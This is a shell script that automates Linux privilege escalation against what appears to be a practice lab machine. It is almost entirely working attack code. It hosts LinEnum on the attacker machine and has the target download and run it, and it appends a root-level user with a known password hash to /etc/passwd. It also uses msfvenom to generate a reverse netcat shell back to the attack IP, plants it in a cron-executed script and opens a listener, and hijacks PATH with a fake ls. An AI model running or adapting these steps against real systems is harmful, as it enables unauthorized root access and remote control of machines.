#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.220.91"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - ENUMERATION"
python3 -m http.server 4444 -d /usr/bin &
PID=$!
sshpass -p password ssh user3@$target_ip "curl -s -X GET http://$attack_ip:4444/LinEnum.sh -o LinEnum.sh"
sshpass -p password ssh user3@$target_ip "chmod +x LinEnum.sh"
sshpass -p password ssh user3@$target_ip "./LinEnum.sh" > $result_folder/linenum.txt
kill -9 $PID

echo "2 - ABUSING SUID FILES"
sshpass -p password ssh user3@$target_ip "find / -perm -u=s -type f 2>/dev/null" > $result_folder/suid.txt

echo "3 - EXPLOITING /etc/passwd"
HASH=$(openssl passwd -1 -salt new 123)
echo "--> Hash is '$HASH'"
ETCPASSWD=$(echo "new:$HASH:0:0:root:/root:/bin/bash" | sed 's/\$/\\\$/g')
sshpass -p password ssh user7@$target_ip "echo $ETCPASSWD >> /etc/passwd"
sshpass -p password ssh user7@$target_ip "cat /etc/passwd"

echo "4 - ESCAPING vi"
sshpass -p password ssh user8@$target_ip "sudo -l"

echo "5 - EXPLOITING crontab"
msfvenom -p cmd/unix/reverse_netcat lhost=$attack_ip lport=4444 R -o $result_folder/autoscript.sh
CONTENT=$(cat $result_folder/autoscript.sh)
echo $CONTENT
sshpass -p password ssh user4@$target_ip "echo \"$CONTENT\" > /home/user4/Desktop/autoscript.sh"
xterm -hold -e "nc -lvnp 4444"

echo "6 - EXPLOITING PATH VARIABLE"
sshpass -p password ssh user5@$target_ip "./script"
sshpass -p password ssh user5@$target_ip "echo \"/bin/bash\" > /tmp/ls"
sshpass -p password ssh user5@$target_ip "chmod +x /tmp/ls"
sshpass -p password ssh user5@$target_ip "export PATH=/tmp:\$PATH"

